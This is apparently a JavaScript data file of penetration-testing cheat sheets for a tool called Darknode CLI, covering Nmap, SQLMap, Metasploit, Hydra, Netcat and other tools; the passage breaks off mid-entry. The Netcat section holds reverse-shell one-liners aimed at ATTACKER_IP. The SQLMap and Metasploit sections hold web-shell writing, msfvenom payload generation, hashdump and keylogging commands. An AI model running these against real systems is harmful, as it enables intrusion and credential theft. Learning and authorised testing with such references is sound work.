'use strict';

// ---------------------------------------------------------------------------
// Darknode CLI -- Comprehensive Cybersecurity Cheat Sheets
// ---------------------------------------------------------------------------
// Each sheet: { name, desc, items: [{ cmd, desc, example? }] }
// Placeholders used throughout: TARGET, VICTIM_IP, ATTACKER_IP, WORDLIST,
// HASH_FILE, DOMAIN, USER, PASS, IFACE, LHOST, LPORT, RHOST, RPORT, etc.
// ---------------------------------------------------------------------------

const CHEAT_SHEETS = [

  // =========================================================================
  // 1. Nmap
  // =========================================================================
  {
    name: 'Nmap',
    desc: 'Network exploration and port scanning',
    items: [
      {
        cmd: 'nmap TARGET',
        desc: 'Basic host discovery and top-1000 port scan',
      },
      {
        cmd: 'nmap -sn TARGET/24',
        desc: 'Ping sweep -- host discovery only, no port scan',
        example: 'nmap -sn 192.168.1.0/24',
      },
      {
        cmd: 'nmap -sS TARGET',
        desc: 'TCP SYN (stealth) scan -- does not complete handshake',
      },
      {
        cmd: 'nmap -sT TARGET',
        desc: 'TCP connect scan -- completes full three-way handshake',
      },
      {
        cmd: 'nmap -sU TARGET',
        desc: 'UDP port scan -- slower but finds UDP services',
      },
      {
        cmd: 'nmap -sV TARGET',
        desc: 'Service version detection on open ports',
      },
      {
        cmd: 'nmap -sV --version-intensity 5 TARGET',
        desc: 'Aggressive version detection with higher intensity',
      },
      {
        cmd: 'nmap -O TARGET',
        desc: 'OS detection via TCP/IP fingerprinting',
      },
      {
        cmd: 'nmap -A TARGET',
        desc: 'Aggressive scan (OS, version, scripts, traceroute combined)',
      },
      {
        cmd: 'nmap -p- TARGET',
        desc: 'Scan all 65535 TCP ports',
      },
      {
        cmd: 'nmap -p 1-1000 TARGET',
        desc: 'Scan a specific port range',
      },
      {
        cmd: 'nmap -p 80,443,8080,8443 TARGET',
        desc: 'Scan specific individual ports',
      },
      {
        cmd: 'nmap --top-ports 100 TARGET',
        desc: 'Scan the top 100 most common ports',
      },
      {
        cmd: 'nmap -T4 TARGET',
        desc: 'Set timing template (0=paranoid ... 5=insane)',
      },
      {
        cmd: 'nmap --min-rate 1000 TARGET',
        desc: 'Force minimum packet send rate for fast scans',
      },
      {
        cmd: 'nmap --max-retries 1 TARGET',
        desc: 'Reduce retries for faster scanning',
      },
      {
        cmd: 'nmap -sC TARGET',
        desc: 'Run default NSE scripts (equivalent to --script=default)',
      },
      {
        cmd: 'nmap --script=vuln TARGET',
        desc: 'Run vulnerability detection scripts',
      },
      {
        cmd: 'nmap --script=http-enum TARGET',
        desc: 'Enumerate web server directories and files',
      },
      {
        cmd: 'nmap --script=smb-vuln* TARGET',
        desc: 'Check for SMB vulnerabilities (EternalBlue, etc.)',
      },
      {
        cmd: 'nmap --script=smb-enum-shares TARGET',
        desc: 'Enumerate accessible SMB shares',
      },
      {
        cmd: 'nmap -sV --script=banner TARGET',
        desc: 'Grab service banners for fingerprinting',
      },
      {
        cmd: 'nmap --script=dns-brute DOMAIN',
        desc: 'DNS subdomain brute force via NSE',
      },
      {
        cmd: 'nmap -oN output.txt TARGET',
        desc: 'Save output in normal (human-readable) format',
      },
      {
        cmd: 'nmap -oX output.xml TARGET',
        desc: 'Save output in XML format (for parsing)',
      },
      {
        cmd: 'nmap -oG output.gnmap TARGET',
        desc: 'Save output in grepable format',
      },
      {
        cmd: 'nmap -oA output TARGET',
        desc: 'Save output in all three formats simultaneously',
      },
      {
        cmd: 'nmap -Pn TARGET',
        desc: 'Skip host discovery -- treat all hosts as up',
      },
      {
        cmd: 'nmap -sN TARGET',
        desc: 'TCP NULL scan -- no flags set, evades some firewalls',
      },
      {
        cmd: 'nmap -sF TARGET',
        desc: 'TCP FIN scan -- sets only FIN flag',
      },
      {
        cmd: 'nmap -sX TARGET',
        desc: 'TCP Xmas scan -- sets FIN+PSH+URG flags',
      },
      {
        cmd: 'nmap -6 TARGET',
        desc: 'Scan an IPv6 target address',
      },
      {
        cmd: 'nmap -D RND:10 TARGET',
        desc: 'Decoy scan with 10 random source IPs',
      },
      {
        cmd: 'nmap -f TARGET',
        desc: 'Fragment packets to evade packet filters',
      },
      {
        cmd: 'nmap --source-port 53 TARGET',
        desc: 'Spoof source port (e.g., DNS) to bypass firewalls',
      },
      {
        cmd: 'nmap -sS -sV -sC -O -p- -T4 -oA full_scan TARGET',
        desc: 'Full comprehensive scan with all useful options',
        example: 'nmap -sS -sV -sC -O -p- -T4 -oA full_scan 10.10.10.5',
      },
    ],
  },

  // =========================================================================
  // 2. SQLMap
  // =========================================================================
  {
    name: 'SQLMap',
    desc: 'Automatic SQL injection and database takeover',
    items: [
      {
        cmd: 'sqlmap -u "http://TARGET/page?id=1"',
        desc: 'Test URL parameter for SQL injection',
      },
      {
        cmd: 'sqlmap -u "http://TARGET/page?id=1" --dbs',
        desc: 'Enumerate all databases on the server',
      },
      {
        cmd: 'sqlmap -u "http://TARGET/page?id=1" -D dbname --tables',
        desc: 'Enumerate tables in a specific database',
      },
      {
        cmd: 'sqlmap -u "http://TARGET/page?id=1" -D dbname -T users --columns',
        desc: 'Enumerate columns in a specific table',
      },
      {
        cmd: 'sqlmap -u "http://TARGET/page?id=1" -D dbname -T users --dump',
        desc: 'Dump all rows from a table',
      },
      {
        cmd: 'sqlmap -u "http://TARGET/page?id=1" -D dbname -T users -C username,password --dump',
        desc: 'Dump specific columns from a table',
      },
      {
        cmd: 'sqlmap -u "http://TARGET/page?id=1" --dump-all',
        desc: 'Dump all databases, all tables, all data',
      },
      {
        cmd: 'sqlmap -u "http://TARGET/page?id=1" --os-shell',
        desc: 'Attempt to get an interactive OS shell',
      },
      {
        cmd: 'sqlmap -u "http://TARGET/page?id=1" --os-pwn',
        desc: 'Attempt out-of-band shell via Meterpreter or VNC',
      },
      {
        cmd: 'sqlmap -u "http://TARGET/page?id=1" --batch',
        desc: 'Run in non-interactive mode with default answers',
      },
      {
        cmd: 'sqlmap -u "http://TARGET/page?id=1" --level=5 --risk=3',
        desc: 'Maximum detection level and risk setting',
      },
      {
        cmd: 'sqlmap -u "http://TARGET/page?id=1" --tamper=space2comment',
        desc: 'Use tamper script to bypass WAF (replace spaces with comments)',
      },
      {
        cmd: 'sqlmap -u "http://TARGET/page?id=1" --tamper=between,randomcase',
        desc: 'Chain multiple tamper scripts for evasion',
      },
      {
        cmd: 'sqlmap -u "http://TARGET/page?id=1" --tamper=charencode',
        desc: 'URL-encode all characters in the payload',
      },
      {
        cmd: 'sqlmap -r request.txt',
        desc: 'Test injection from a saved HTTP request file (e.g., from Burp)',
      },
      {
        cmd: 'sqlmap -r request.txt -p parameter_name',
        desc: 'Test only a specific parameter from request file',
      },
      {
        cmd: 'sqlmap -u "http://TARGET/page?id=1" --proxy="http://127.0.0.1:8080"',
        desc: 'Route traffic through a proxy (e.g., Burp Suite)',
      },
      {
        cmd: 'sqlmap -u "http://TARGET/page?id=1" --cookie="PHPSESSID=abc123"',
        desc: 'Provide session cookie for authenticated testing',
      },
      {
        cmd: 'sqlmap -u "http://TARGET/page?id=1" --random-agent',
        desc: 'Use a random User-Agent header for each request',
      },
      {
        cmd: 'sqlmap -u "http://TARGET/page?id=1" --technique=BEUSTQ',
        desc: 'Specify which injection techniques to test',
      },
      {
        cmd: 'sqlmap -u "http://TARGET/page?id=1" --is-dba',
        desc: 'Check if current database user has DBA privileges',
      },
      {
        cmd: 'sqlmap -u "http://TARGET/page?id=1" --current-user',
        desc: 'Retrieve the current database user',
      },
      {
        cmd: 'sqlmap -u "http://TARGET/page?id=1" --current-db',
        desc: 'Retrieve the current database name',
      },
      {
        cmd: 'sqlmap -u "http://TARGET/page?id=1" --passwords',
        desc: 'Enumerate and attempt to crack DBMS user password hashes',
      },
      {
        cmd: 'sqlmap -u "http://TARGET/page?id=1" --file-read="/etc/passwd"',
        desc: 'Read a file from the remote server filesystem',
      },
      {
        cmd: 'sqlmap -u "http://TARGET/page?id=1" --file-write=shell.php --file-dest=/var/www/html/shell.php',
        desc: 'Write a local file to the remote server',
      },
      {
        cmd: 'sqlmap -u "http://TARGET/page?id=1" --forms --crawl=3',
        desc: 'Crawl the site and automatically test all discovered forms',
      },
      {
        cmd: 'sqlmap -u "http://TARGET/page?id=1" --dbms=mysql',
        desc: 'Force detection against a specific DBMS backend',
      },
      {
        cmd: 'sqlmap -u "http://TARGET/page?id=1" --threads=10',
        desc: 'Use multiple threads for faster data retrieval',
      },
      {
        cmd: 'sqlmap -u "http://TARGET/page?id=1" --sql-query="SELECT user()"',
        desc: 'Execute a custom SQL query through the injection',
      },
    ],
  },

  // =========================================================================
  // 3. Metasploit
  // =========================================================================
  {
    name: 'Metasploit',
    desc: 'Penetration testing framework -- msfconsole, exploits, post-exploitation',
    items: [
      {
        cmd: 'msfconsole',
        desc: 'Launch the Metasploit Framework console',
      },
      {
        cmd: 'msfdb init',
        desc: 'Initialize the Metasploit PostgreSQL database',
      },
      {
        cmd: 'search type:exploit platform:windows smb',
        desc: 'Search for exploits by type, platform, and keyword',
      },
      {
        cmd: 'search cve:2021',
        desc: 'Search modules by CVE year',
      },
      {
        cmd: 'use exploit/multi/handler',
        desc: 'Select the generic multi/handler module',
      },
      {
        cmd: 'info',
        desc: 'Show detailed info about the current module',
      },
      {
        cmd: 'show options',
        desc: 'Display configurable options for current module',
      },
      {
        cmd: 'show payloads',
        desc: 'List compatible payloads for current exploit',
      },
      {
        cmd: 'show targets',
        desc: 'List available targets for current exploit',
      },
      {
        cmd: 'set RHOSTS TARGET',
        desc: 'Set remote target host(s)',
      },
      {
        cmd: 'set LHOST ATTACKER_IP',
        desc: 'Set local (attacker) IP for reverse connections',
      },
      {
        cmd: 'set LPORT 4444',
        desc: 'Set local listening port for callbacks',
      },
      {
        cmd: 'set PAYLOAD windows/meterpreter/reverse_tcp',
        desc: 'Set the payload to deliver',
      },
      {
        cmd: 'exploit',
        desc: 'Launch the selected exploit',
      },
      {
        cmd: 'exploit -j',
        desc: 'Run exploit as a background job',
      },
      {
        cmd: 'sessions -l',
        desc: 'List all active sessions',
      },
      {
        cmd: 'sessions -i 1',
        desc: 'Interact with session number 1',
      },
      {
        cmd: 'background',
        desc: 'Background the current Meterpreter session',
      },
      {
        cmd: 'use post/multi/recon/local_exploit_suggester',
        desc: 'Suggest local privilege escalation exploits for a session',
      },
      {
        cmd: 'run autoroute -s 10.10.10.0/24',
        desc: 'Add a route through a compromised host for pivoting',
      },
      {
        cmd: 'use auxiliary/server/socks_proxy',
        desc: 'Start a SOCKS proxy for pivoting through Metasploit',
      },
      {
        cmd: 'db_nmap -sV TARGET',
        desc: 'Run Nmap from within Metasploit and store results in DB',
      },
      {
        cmd: 'hosts',
        desc: 'List all discovered hosts in the database',
      },
      {
        cmd: 'services',
        desc: 'List all discovered services in the database',
      },
      {
        cmd: 'vulns',
        desc: 'List all recorded vulnerabilities in the database',
      },
      {
        cmd: 'creds',
        desc: 'List all captured credentials in the database',
      },
      {
        cmd: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o payload.exe',
        desc: 'Generate a Windows reverse Meterpreter EXE payload',
      },
      {
        cmd: 'msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf -o shell.elf',
        desc: 'Generate a Linux reverse shell ELF payload',
      },
      {
        cmd: 'msfvenom -p php/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f raw -o shell.php',
        desc: 'Generate a PHP reverse shell payload',
      },
      {
        cmd: 'msfvenom -l payloads | grep windows',
        desc: 'List all available Windows payloads',
      },
      {
        cmd: 'use exploit/windows/smb/ms17_010_eternalblue',
        desc: 'Load the EternalBlue exploit module',
      },
      // Meterpreter commands
      {
        cmd: 'sysinfo',
        desc: 'Meterpreter: display system information',
      },
      {
        cmd: 'getuid',
        desc: 'Meterpreter: show current user identity',
      },
      {
        cmd: 'getsystem',
        desc: 'Meterpreter: attempt automatic privilege escalation to SYSTEM',
      },
      {
        cmd: 'hashdump',
        desc: 'Meterpreter: dump SAM database password hashes',
      },
      {
        cmd: 'upload /local/file.exe C:\\\\Windows\\\\Temp\\\\file.exe',
        desc: 'Meterpreter: upload a file to the target system',
      },
      {
        cmd: 'download C:\\\\Users\\\\Admin\\\\Desktop\\\\flag.txt /local/',
        desc: 'Meterpreter: download a file from the target system',
      },
      {
        cmd: 'shell',
        desc: 'Meterpreter: drop into a native system command shell',
      },
      {
        cmd: 'migrate PID',
        desc: 'Meterpreter: migrate to another process by PID',
      },
      {
        cmd: 'keyscan_start',
        desc: 'Meterpreter: start capturing keystrokes',
      },
      {
        cmd: 'keyscan_dump',
        desc: 'Meterpreter: dump captured keystrokes',
      },
      {
        cmd: 'portfwd add -l LPORT -p RPORT -r TARGET',
        desc: 'Meterpreter: set up port forwarding through session',
      },
      {
        cmd: 'run post/windows/gather/enum_applications',
        desc: 'Meterpreter: enumerate installed applications',
      },
    ],
  },

  // =========================================================================
  // 4. Hydra
  // =========================================================================
  {
    name: 'Hydra',
    desc: 'Online brute force and password spraying tool',
    items: [
      {
        cmd: 'hydra -l USER -P WORDLIST TARGET ssh',
        desc: 'Brute force SSH with a single username and password list',
        example: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.5 ssh',
      },
      {
        cmd: 'hydra -L users.txt -P WORDLIST TARGET ssh',
        desc: 'Brute force SSH with a username list',
      },
      {
        cmd: 'hydra -l USER -P WORDLIST TARGET ftp',
        desc: 'Brute force FTP login',
      },
      {
        cmd: 'hydra -l USER -P WORDLIST TARGET mysql',
        desc: 'Brute force MySQL login',
      },
      {
        cmd: 'hydra -l USER -P WORDLIST TARGET smb',
        desc: 'Brute force SMB/CIFS login',
      },
      {
        cmd: 'hydra -l USER -P WORDLIST TARGET rdp',
        desc: 'Brute force RDP login',
      },
      {
        cmd: 'hydra -l USER -P WORDLIST TARGET telnet',
        desc: 'Brute force Telnet login',
      },
      {
        cmd: 'hydra -l USER -P WORDLIST TARGET vnc',
        desc: 'Brute force VNC login',
      },
      {
        cmd: 'hydra -l USER -P WORDLIST TARGET pop3',
        desc: 'Brute force POP3 email login',
      },
      {
        cmd: 'hydra -l USER -P WORDLIST TARGET imap',
        desc: 'Brute force IMAP email login',
      },
      {
        cmd: 'hydra -l USER -P WORDLIST TARGET smtp',
        desc: 'Brute force SMTP login',
      },
      {
        cmd: 'hydra -l USER -P WORDLIST TARGET mssql',
        desc: 'Brute force Microsoft SQL Server login',
      },
      {
        cmd: 'hydra -l admin -P WORDLIST TARGET http-get /admin',
        desc: 'Brute force HTTP Basic Authentication',
      },
      {
        cmd: 'hydra -l admin -P WORDLIST TARGET http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"',
        desc: 'Brute force HTTP POST login form',
        example: 'hydra -l admin -P rockyou.txt 10.10.10.5 http-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed"',
      },
      {
        cmd: 'hydra -L users.txt -p "Password123" TARGET ssh',
        desc: 'Password spray -- single password against many usernames',
      },
      {
        cmd: 'hydra -C creds.txt TARGET ssh',
        desc: 'Use colon-separated user:pass combo file',
      },
      {
        cmd: 'hydra -l USER -P WORDLIST -s 2222 TARGET ssh',
        desc: 'Specify a non-default service port',
      },
      {
        cmd: 'hydra -l USER -P WORDLIST -t 16 TARGET ssh',
        desc: 'Set number of parallel tasks (threads)',
      },
      {
        cmd: 'hydra -l USER -P WORDLIST -V TARGET ssh',
        desc: 'Verbose mode -- print every login attempt',
      },
      {
        cmd: 'hydra -l USER -P WORDLIST -o results.txt TARGET ssh',
        desc: 'Save successful results to an output file',
      },
      {
        cmd: 'hydra -l USER -P WORDLIST -e nsr TARGET ssh',
        desc: 'Try null password, login as password, and reversed login',
      },
      {
        cmd: 'hydra -l USER -P WORDLIST -f TARGET ssh',
        desc: 'Stop after first valid credential is found',
      },
      {
        cmd: 'hydra -l USER -P WORDLIST -w 5 TARGET ssh',
        desc: 'Set wait time between connections in seconds',
      },
      {
        cmd: 'hydra -R',
        desc: 'Restore and continue a previously aborted session',
      },
      {
        cmd: 'hydra -l USER -P WORDLIST -M targets.txt ssh',
        desc: 'Attack multiple targets from a file simultaneously',
      },
    ],
  },

  // =========================================================================
  // 5. Gobuster
  // =========================================================================
  {
    name: 'Gobuster',
    desc: 'Directory, file, DNS, and virtual host brute forcing',
    items: [
      {
        cmd: 'gobuster dir -u http://TARGET -w WORDLIST',
        desc: 'Directory brute force with default settings',
        example: 'gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt',
      },
      {
        cmd: 'gobuster dir -u http://TARGET -w WORDLIST -x php,html,txt',
        desc: 'Search for specific file extensions',
      },
      {
        cmd: 'gobuster dir -u http://TARGET -w WORDLIST -x php,html,txt,bak,old,zip',
        desc: 'Search for backup and archive file extensions',
      },
      {
        cmd: 'gobuster dir -u http://TARGET -w WORDLIST -t 50',
        desc: 'Set number of concurrent threads',
      },
      {
        cmd: 'gobuster dir -u http://TARGET -w WORDLIST -o output.txt',
        desc: 'Save results to an output file',
      },
      {
        cmd: 'gobuster dir -u http://TARGET -w WORDLIST -s 200,301,302',
        desc: 'Only show results with specific HTTP status codes',
      },
      {
        cmd: 'gobuster dir -u http://TARGET -w WORDLIST -b 404,403',
        desc: 'Exclude (blacklist) specific status codes from output',
      },
      {
        cmd: 'gobuster dir -u http://TARGET -w WORDLIST -r',
        desc: 'Follow HTTP redirects automatically',
      },
      {
        cmd: 'gobuster dir -u http://TARGET -w WORDLIST -k',
        desc: 'Skip TLS certificate verification for HTTPS targets',
      },
      {
        cmd: 'gobuster dir -u http://TARGET -w WORDLIST -c "session=abc123"',
        desc: 'Provide cookies for authenticated directory scanning',
      },
      {
        cmd: 'gobuster dir -u http://TARGET -w WORDLIST -H "Authorization: Bearer TOKEN"',
        desc: 'Add a custom HTTP header to requests',
      },
      {
        cmd: 'gobuster dir -u http://TARGET -w WORDLIST -a "Mozilla/5.0"',
        desc: 'Set a custom User-Agent string',
      },
      {
        cmd: 'gobuster dir -u http://TARGET -w WORDLIST --wildcard',
        desc: 'Force processing even with wildcard responses',
      },
      {
        cmd: 'gobuster dir -u http://TARGET -w WORDLIST -n',
        desc: 'Do not print HTTP status codes in output',
      },
      {
        cmd: 'gobuster dir -u http://TARGET -w WORDLIST --delay 100ms',
        desc: 'Add delay between requests to avoid rate limiting',
      },
      {
        cmd: 'gobuster dns -d DOMAIN -w WORDLIST',
        desc: 'DNS subdomain enumeration mode',
        example: 'gobuster dns -d example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt',
      },
      {
        cmd: 'gobuster dns -d DOMAIN -w WORDLIST -i',
        desc: 'DNS enumeration showing resolved IP addresses',
      },
      {
        cmd: 'gobuster dns -d DOMAIN -w WORDLIST --wildcard',
        desc: 'DNS enumeration with wildcard domain processing',
      },
      {
        cmd: 'gobuster vhost -u http://TARGET -w WORDLIST',
        desc: 'Virtual host discovery mode',
      },
      {
        cmd: 'gobuster vhost -u http://TARGET -w WORDLIST --append-domain',
        desc: 'Append base domain to each word for vhost scanning',
      },
      {
        cmd: 'gobuster fuzz -u http://TARGET/FUZZ -w WORDLIST',
        desc: 'Fuzz mode -- replace FUZZ keyword anywhere in the URL',
      },
      {
        cmd: 'gobuster dir -u https://TARGET -w WORDLIST -p socks5://127.0.0.1:1080',
        desc: 'Route traffic through a SOCKS5 proxy',
      },
      {
        cmd: 'gobuster dir -u http://TARGET -w WORDLIST --no-error',
        desc: 'Suppress connection error messages in output',
      },
    ],
  },

  // =========================================================================
  // 6. Burp Suite
  // =========================================================================
  {
    name: 'Burp Suite',
    desc: 'Web application security testing proxy and scanner',
    items: [
      {
        cmd: 'Proxy > Intercept > Toggle "Intercept is on"',
        desc: 'Enable or disable request interception',
      },
      {
        cmd: 'Proxy > Options > Add listener on 127.0.0.1:8080',
        desc: 'Configure the proxy listener address and port',
      },
      {
        cmd: 'Proxy > HTTP history',
        desc: 'View all proxied HTTP requests and responses',
      },
      {
        cmd: 'Target > Scope > Add URL to scope',
        desc: 'Define target scope to filter traffic to relevant hosts',
      },
      {
        cmd: 'Proxy > Options > Intercept > Only in-scope items',
        desc: 'Intercept only requests matching scope definition',
      },
      {
        cmd: 'Right-click request > Send to Repeater',
        desc: 'Send a captured request to Repeater for manual testing',
      },
      {
        cmd: 'Right-click request > Send to Intruder',
        desc: 'Send a request to Intruder for automated fuzzing',
      },
      {
        cmd: 'Intruder > Positions > Mark payload positions',
        desc: 'Define injection points in the request with position markers',
      },
      {
        cmd: 'Intruder > Payloads > Load payload list from file',
        desc: 'Load a wordlist or payload list for Intruder attacks',
      },
      {
        cmd: 'Intruder > Attack type > Sniper',
        desc: 'Single payload set cycling through one position at a time',
      },
      {
        cmd: 'Intruder > Attack type > Battering Ram',
        desc: 'Same payload inserted into all positions simultaneously',
      },
      {
        cmd: 'Intruder > Attack type > Pitchfork',
        desc: 'Multiple payload sets iterated in parallel (one-to-one)',
      },
      {
        cmd: 'Intruder > Attack type > Cluster Bomb',
        desc: 'Multiple payload sets with all permutations tested',
      },
      {
        cmd: 'Repeater > Modify request > Click Send',
        desc: 'Manually modify parameters and resend the request',
      },
      {
        cmd: 'Decoder > Paste data > Decode as URL/Base64/HTML',
        desc: 'Decode encoded data in various formats',
      },
      {
        cmd: 'Decoder > Encode as URL/Base64/HTML',
        desc: 'Encode data into various formats for payloads',
      },
      {
        cmd: 'Comparer > Paste items > Compare (Words or Bytes)',
        desc: 'Compare two responses side-by-side to find differences',
      },
      {
        cmd: 'Scanner > Right-click > Actively scan',
        desc: 'Run the active vulnerability scanner on a specific request',
      },
      {
        cmd: 'Scanner > Right-click > Passively scan',
        desc: 'Analyze proxied traffic without sending additional requests',
      },
      {
        cmd: 'Extender > BApp Store > Install extension',
        desc: 'Install community extensions from the BApp Store',
      },
      {
        cmd: 'Project options > Sessions > Cookie jar',
        desc: 'Configure automatic cookie handling and storage',
      },
      {
        cmd: 'Project options > Sessions > Session handling rules',
        desc: 'Create macro-based session management for complex auth',
      },
      {
        cmd: 'Match and Replace > Options > Add rule',
        desc: 'Automatically modify requests or responses matching patterns',
      },
      {
        cmd: 'Logger > View all tool traffic',
        desc: 'View HTTP traffic from all Burp tools in one central place',
      },
      {
        cmd: 'Collaborator > Copy to clipboard',
        desc: 'Generate a Burp Collaborator payload for out-of-band testing',
      },
    ],
  },

  // =========================================================================
  // 7. Wireshark
  // =========================================================================
  {
    name: 'Wireshark',
    desc: 'Network protocol analyzer -- display and capture filters',
    items: [
      {
        cmd: 'ip.addr == TARGET',
        desc: 'Display filter: show all traffic to/from an IP address',
      },
      {
        cmd: 'ip.src == ATTACKER_IP',
        desc: 'Display filter: show traffic originating from a specific IP',
      },
      {
        cmd: 'ip.dst == VICTIM_IP',
        desc: 'Display filter: show traffic destined for a specific IP',
      },
      {
        cmd: 'tcp.port == 80',
        desc: 'Display filter: show all traffic on TCP port 80',
      },
      {
        cmd: 'udp.port == 53',
        desc: 'Display filter: show all DNS (UDP 53) traffic',
      },
      {
        cmd: 'tcp.flags.syn == 1 && tcp.flags.ack == 0',
        desc: 'Display filter: show SYN packets (new connection attempts)',
      },
      {
        cmd: 'tcp.flags.reset == 1',
        desc: 'Display filter: show TCP RST packets (refused connections)',
      },
      {
        cmd: 'http',
        desc: 'Display filter: show all HTTP protocol traffic',
      },
      {
        cmd: 'http.request.method == "POST"',
        desc: 'Display filter: show only HTTP POST requests',
      },
      {
        cmd: 'http.request.uri contains "login"',
        desc: 'Display filter: show HTTP requests with "login" in the URI',
      },
      {
        cmd: 'http.response.code == 200',
        desc: 'Display filter: show HTTP 200 OK responses',
      },
      {
        cmd: 'dns',
        desc: 'Display filter: show all DNS protocol traffic',
      },
      {
        cmd: 'dns.qry.name contains "DOMAIN"',
        desc: 'Display filter: show DNS queries for a specific domain',
      },
      {
        cmd: 'ftp',
        desc: 'Display filter: show all FTP traffic',
      },
      {
        cmd: 'smtp || pop || imap',
        desc: 'Display filter: show all email protocol traffic',
      },
      {
        cmd: 'tcp.analysis.retransmission',
        desc: 'Display filter: show TCP retransmissions (network issues)',
      },
      {
        cmd: 'tcp.stream eq 0',
        desc: 'Display filter: isolate and follow a specific TCP stream',
      },
      {
        cmd: 'frame contains "password"',
        desc: 'Display filter: search frame data for a string',
      },
      {
        cmd: '!(arp || dns || icmp)',
        desc: 'Display filter: exclude common noise protocols',
      },
      {
        cmd: 'tls.handshake.type == 1',
        desc: 'Display filter: show TLS Client Hello messages',
      },
      {
        cmd: 'host TARGET',
        desc: 'Capture filter (BPF): capture only traffic to/from a specific host',
      },
      {
        cmd: 'port 443',
        desc: 'Capture filter (BPF): capture only traffic on port 443',
      },
      {
        cmd: 'net 10.10.10.0/24',
        desc: 'Capture filter (BPF): capture traffic for a subnet',
      },
      {
        cmd: 'tcp portrange 1-1024',
        desc: 'Capture filter (BPF): capture a range of TCP ports',
      },
      {
        cmd: 'Right-click stream > Follow > TCP Stream',
        desc: 'Reconstruct and view a full TCP conversation',
      },
      {
        cmd: 'Statistics > Conversations',
        desc: 'View top talkers and per-conversation statistics',
      },
      {
        cmd: 'Statistics > Protocol Hierarchy',
        desc: 'View a breakdown of all protocols in the capture',
      },
      {
        cmd: 'File > Export Objects > HTTP',
        desc: 'Extract files that were transferred over HTTP',
      },
      {
        cmd: 'tshark -i IFACE -w capture.pcap',
        desc: 'CLI: capture live packets to a pcap file',
      },
      {
        cmd: 'tshark -r capture.pcap -Y "http"',
        desc: 'CLI: read a pcap and apply a display filter',
      },
    ],
  },

  // =========================================================================
  // 8. Netcat
  // =========================================================================
  {
    name: 'Netcat',
    desc: 'TCP/UDP networking utility -- reverse shells, file transfer, scanning',
    items: [
      {
        cmd: 'nc -lvnp LPORT',
        desc: 'Start a TCP listener on a port (catch a reverse shell)',
        example: 'nc -lvnp 4444',
      },
      {
        cmd: 'nc ATTACKER_IP LPORT -e /bin/bash',
        desc: 'Connect back with a bash shell (traditional nc with -e)',
      },
      {
        cmd: 'nc -nv TARGET RPORT',
        desc: 'Connect to a remote service for banner grabbing',
        example: 'nc -nv 10.10.10.5 80',
      },
      {
        cmd: 'nc -zv TARGET 1-1000',
        desc: 'Port scan a range of TCP ports (connect mode)',
      },
      {
        cmd: 'nc -zv TARGET 80 443 8080',
        desc: 'Check if specific ports are open',
      },
      {
        cmd: 'nc -u -lvnp LPORT',
        desc: 'Listen on a UDP port',
      },
      {
        cmd: 'nc -u TARGET RPORT',
        desc: 'Connect to a remote UDP service',
      },
      {
        cmd: 'nc -lvnp LPORT > received_file',
        desc: 'Receive a file sent over netcat (listener side)',
      },
      {
        cmd: 'nc TARGET RPORT < file_to_send',
        desc: 'Send a file to a netcat listener',
      },
      {
        cmd: 'nc -lvnp LPORT -k',
        desc: 'Keep listening after client disconnects (-k for persistent)',
      },
      {
        cmd: 'nc -w 3 TARGET RPORT',
        desc: 'Set connection timeout to 3 seconds',
      },
      {
        cmd: 'mkfifo /tmp/f; nc -lvnp LPORT < /tmp/f | /bin/bash > /tmp/f 2>&1',
        desc: 'Named pipe reverse shell (works without -e flag)',
      },
      {
        cmd: 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP LPORT > /tmp/f',
        desc: 'Alternative named pipe reverse shell one-liner',
      },
      {
        cmd: 'ncat --ssl -lvnp LPORT',
        desc: 'Ncat: start an encrypted listener with SSL/TLS',
      },
      {
        cmd: 'ncat --ssl TARGET RPORT',
        desc: 'Ncat: connect to an SSL/TLS service',
      },
      {
        cmd: 'ncat --allow ATTACKER_IP -lvnp LPORT -e /bin/bash',
        desc: 'Ncat: restrict connections to a specific IP whitelist',
      },
      {
        cmd: 'nc -lvnp 4444 -e /bin/bash',
        desc: 'Bind shell -- serve a bash shell on a listening port',
      },
      {
        cmd: 'ncat --sh-exec "ncat TARGET 80" -lvnp LPORT --keep-open',
        desc: 'Ncat: relay or proxy traffic to another host and port',
      },
      {
        cmd: 'nc -lvnp LPORT | tee capture.txt',
        desc: 'Listen and log all received data to a file',
      },
      {
        cmd: 'tar czf - /path/to/dir | nc TARGET RPORT',
        desc: 'Send a compressed directory archive over netcat',
      },
      {
        cmd: 'nc -lvnp LPORT | tar xzf -',
        desc: 'Receive and extract a compressed archive via netcat',
      },
    ],
  },

  // =========================================================================
  // 9. John the Ripper
  // =========================================================================
  {
    name: 'John the Ripper',
    desc: 'Password hash cracking -- CPU-based, multiple formats and rules',
    items: [
      {
        cmd: 'john HASH_FILE',
        desc: 'Auto-detect hash type and crack using default settings',
      },
      {
        cmd: 'john --wordlist=WORDLIST HASH_FILE',
        desc: 'Crack hashes using a wordlist',
        example: 'john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt',
      },
      {
        cmd: 'john --wordlist=WORDLIST --rules HASH_FILE',
        desc: 'Apply default mangling rules to the wordlist',
      },
      {
        cmd: 'john --wordlist=WORDLIST --rules=best64 HASH_FILE',
        desc: 'Apply the best64 rule set for efficient mangling',
      },
      {
        cmd: 'john --wordlist=WORDLIST --rules=KoreLogic HASH_FILE',
        desc: 'Apply KoreLogic rules (extensive rule set)',
      },
      {
        cmd: 'john --format=raw-md5 HASH_FILE',
        desc: 'Specify hash format explicitly as raw MD5',
      },
      {
        cmd: 'john --format=raw-sha256 HASH_FILE',
        desc: 'Crack raw SHA-256 hashes',
      },
      {
        cmd: 'john --format=raw-sha512 HASH_FILE',
        desc: 'Crack raw SHA-512 hashes',
      },
      {
        cmd: 'john --format=bcrypt HASH_FILE',
        desc: 'Crack bcrypt ($2a$, $2b$) hashes',
      },
      {
        cmd: 'john --format=nt HASH_FILE',
        desc: 'Crack NTLM/NT hashes',
      },
      {
        cmd: 'john --format=krb5tgs HASH_FILE',
